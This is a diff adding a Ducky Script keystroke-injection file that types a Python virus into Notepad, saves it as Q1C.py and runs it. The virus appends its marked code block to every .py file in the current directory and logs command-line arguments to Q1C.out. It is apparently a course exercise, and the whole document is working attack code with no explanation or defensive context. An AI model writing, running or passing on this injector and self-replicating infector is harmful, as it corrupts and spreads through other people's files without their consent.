@@ -1,0 +1,93 @@
+REM Inject Q1C.py into the system
+GUI r
+DELAY 500
+STRING notepad
+ENTER
+DELAY 1000
+
+STRING import os
+ENTER
+STRING import sys
+ENTER
+STRING def get_virus_code():
+ENTER
+STRING     with open(__file__, 'r') as f:
+ENTER
+STRING         code = f.readlines()
+ENTER
+STRING     virus_code = []
+ENTER
+STRING     in_virus = False
+ENTER
+STRING     for line in code:
+ENTER
+STRING         if line.strip() == '# VIRUS_START':
+ENTER
+STRING             in_virus = True
+ENTER
+STRING         if in_virus:
+ENTER
+STRING             virus_code.append(line)
+ENTER
+STRING         if line.strip() == '# VIRUS_END':
+ENTER
+STRING             break
+ENTER
+STRING     return ''.join(virus_code)
+ENTER
+STRING def infect(file_path):
+ENTER
+STRING     if not file_path.endswith('.py'):
+ENTER
+STRING         return
+ENTER
+STRING     with open(file_path, 'r') as f:
+ENTER
+STRING         content = f.read()
+ENTER
+STRING     if '# VIRUS_START' in content:
+ENTER
+STRING         return
+ENTER
+STRING     virus_code = get_virus_code()
+ENTER
+STRING     new_content = content + '\n' + virus_code
+ENTER
+STRING     with open(file_path, 'w') as f:
+ENTER
+STRING         f.write(new_content)
+ENTER
+STRING def propagate():
+ENTER
+STRING     for file in os.listdir('.'):
+ENTER
+STRING         infect(file)
+ENTER
+STRING def payload():
+ENTER
+STRING     with open('Q1C.out', 'a') as f:
+ENTER
+STRING         f.write(f"{' '.join(sys.argv)}\\n")
+ENTER
+STRING # VIRUS_START
+ENTER
+STRING if __name__ == "__main__":
+ENTER
+STRING     propagate()
+ENTER
+STRING     payload()
+ENTER
+STRING # VIRUS_END
+ENTER
+DELAY 1000
+CONTROL s
+DELAY 500
+STRING Q1C.py
+ENTER
+DELAY 1000
+ALT F4
+DELAY 500
+GUI r
+DELAY 500
+STRING python Q1C.py
+ENTER
